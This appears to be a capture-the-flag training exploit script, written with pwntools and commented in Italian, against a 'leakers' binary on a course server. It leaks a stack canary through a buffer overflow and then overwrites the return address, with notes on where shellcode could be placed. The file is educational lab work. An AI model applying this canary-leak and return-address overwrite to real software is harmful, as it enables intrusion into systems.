''' 
We need to leak the canary.
Abbiamo una print dopo la read che stampa i valori che metto in input.
L'idea è quella di riempire il buffer con abbastanza bytes per raggiungere il canary e così la print mi stampa la mia stringa e il canary
'''
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

# printf address: 0x00401348
if "REMOTE" not in args:
    r = process("./leakers")
    gdb.attach(r,'''
        b * 0x00401348
        c
    ''')
else:
    r = remote("bin.training.offdef.it", 2010)

input("wait")

ps1 = b"A"*10
r.sendline(ps1) #uso sendline perchè fa una send e poi un \n (visto che dopo vado a mettere un'altra riga di input)

'''
stackstuff = b"B"*104
r.send(stackstuff)
time.sleep(0.1) #questo serve per dare il tempo a gdb di fare la print del canary prima che venga sovrascritto (È utilizzato per dare al programma remoto il tempo di elaborare le informazioni inviate prima di procedere.)

#Da quì se lo runno prendo l'indirizzo di rax che contiene il buffer e faccio in gdb x/40gx 0x7ffef48fbbf0 (ma nella nuova registrazione prende l'indirizzo di rsp --> x/40gx $rsp) per vedere il canary che finirà con 00
# È little endian (va letto al contrario) quindi il canary comincia (sempre) con 00
#il canary si può anche trovare scrivendo il comando canary in gdb (ma non sempre funziona)
'''
stackstuff = b"B"*105 #sovrascrivo il primo byte del canary (00) e così stampo il canary
r.send(stackstuff)
time.sleep(0.1)
r.recvuntil(b"> ") #questo comando serve per aspettare che il programma remoto stampi la stringa che gli ho mandato prima di mandare la seconda
#r.recv(104) #questo comando serve per leggere i primi 104 bytes che sono la stringa che ho mandato prima
#canary = u64(r.recv(8)) #questo comando serve per leggere gli 8 bytes che sono il canary
#print("%#x" % canary)
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary: %#x" % canary)

address = 0x4142434445464748
payload = b"B"*104 + p64(canary) + b"D"*8 + p64(address) #questo payload serve per sovrascrivere il canary con il suo stesso valore e poi sovrascrivere l'indirizzo di ritorno con il mio address
#b"D"*8 viene messo perchè siamo nel base address (è un padding per allineare le cose)

'''
Per lo shellcode, siccome abbiamo un new kernell e non eseguibile, abbiamo due opzioni: 
1) scriviamo lo shellcode in ps1 e poi jumpiamo lì (sappiamo l'indirizzo)
2) lo stack è readable, writable and executable anche nel nuovo kernell e quindi posso anche esploitare questo, devo solo
   scrivere sullo stack e jumpare sullo stack

La seconda opzione è più difficile
'''
r.send(payload)
time.sleep(0.1)
r.interactive()
#con il comando vmmap in gdb vedo dove posso saltare


'''
VEDERE SECONDO FILE in cui viene adottata la prima soluzione
'''
